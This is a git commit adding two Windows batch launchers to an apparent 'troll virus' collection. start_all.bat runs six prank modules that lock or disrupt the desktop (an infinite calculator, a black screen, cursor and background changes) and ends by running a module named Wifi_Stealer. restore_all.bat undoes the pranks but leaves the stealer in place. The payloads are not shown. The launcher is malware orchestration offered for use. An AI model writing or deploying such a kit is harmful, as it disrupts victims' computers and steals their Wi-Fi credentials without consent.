9a5e1420babaddbb2d58c20394ef7fb9fd82006c
BiMathAx <61063210+MathKode@users.noreply.github.com>
2022-12-29 12:51:53 +0100

    Add files via upload

---
+++ restore_all.bat
@@ -0,0 +1,35 @@
+@rem Execute all the restore file to remove all troll virus
+@echo off
+
+echo --- Infinite_Calculator ---
+cd Infinite_Calculator
+.\restore.bat
+cd ..
+
+echo --- Black_Screen ---
+cd Black_Screen
+.\restore.bat
+cd ..
+
+echo --- Shrek_Cursor ---
+cd Shrek_Cursor
+.\restore.bat
+cd ..
+
+echo --- BackGround_Virus ---
+cd BackGround_Virus
+.\restore.bat
+cd ..
+
+echo --- OniiChan_Virus ---
+cd OniiChan_Virus
+.\reset.bat
+cd ..
+
+echo --- Welcome_Message ---
+cd Welcome_Message
+.\restore.bat
+cd ..
+
+echo --- END RESTORE ---
+pause
---
+++ start_all.bat
@@ -0,0 +1,41 @@
+@rem Start_All Troll Virus
+@echo off
+
+
+echo --- Infinite_Calculator ---
+cd Infinite_Calculator
+.\starter.bat
+cd ..
+
+echo --- Black_Screen ---
+cd Black_Screen
+.\starter.bat
+cd ..
+
+echo --- Shrek_Cursor ---
+cd Shrek_Cursor
+.\starter.bat
+cd ..
+
+echo --- BackGround_Virus ---
+cd BackGround_Virus
+.\starter.bat
+cd ..
+
+echo --- OniiChan_Virus ---
+cd OniiChan_Virus
+.\starter.bat
+cd ..
+
+echo --- Welcome_Message ---
+cd Welcome_Message
+.\starter.bat
+cd ..
+
+echo --- Wifi_Stealer ---
+cd Wifi_Stealer
+.\main.bat
+cd ..
+
+echo -- END StartALL --
+pause
